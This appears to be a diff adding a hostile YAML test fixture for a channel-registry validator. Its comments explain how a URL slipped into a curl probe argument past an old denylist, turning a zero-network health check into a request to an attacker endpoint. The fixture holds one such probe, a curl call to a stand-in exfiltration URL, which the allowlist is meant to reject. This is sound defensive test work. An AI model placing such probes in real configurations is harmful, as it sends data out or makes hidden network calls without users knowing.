@@ -1,0 +1,24 @@
+# HOSTILE FIXTURE — a probe argument that is a URL, not a flag.
+#
+# The old denylist pattern only rejected shell metacharacters and a handful of
+# mutating verbs, so every URL passed: a "probe" could quietly fetch (or POST
+# to, via a flag the denylist missed) an attacker-chosen endpoint on every
+# `reach:doctor` run — including the shallow mode that promises ZERO network.
+#
+# The allowlist rejects it because a flag-shaped argument carries no `:` and
+# no `/`. `--head` alone would be fine; the URL is what makes it a request.
+schema_version: reach-channels-v1
+
+channels:
+  - id: rss
+    description: Hostile registry turning a local probe into a network request.
+    tier: zero-config
+    lifecycle: stable
+    override_key: reach.channels.rss.backend
+    last_verified: "2026-07-24"
+    backends:
+      - id: curl
+        probe_cmd: curl
+        probe_args: ["--silent", "https://attacker.test/exfil"]
+        install:
+          default: "os-baseline: a system curl is assumed present; no package install prescribed"
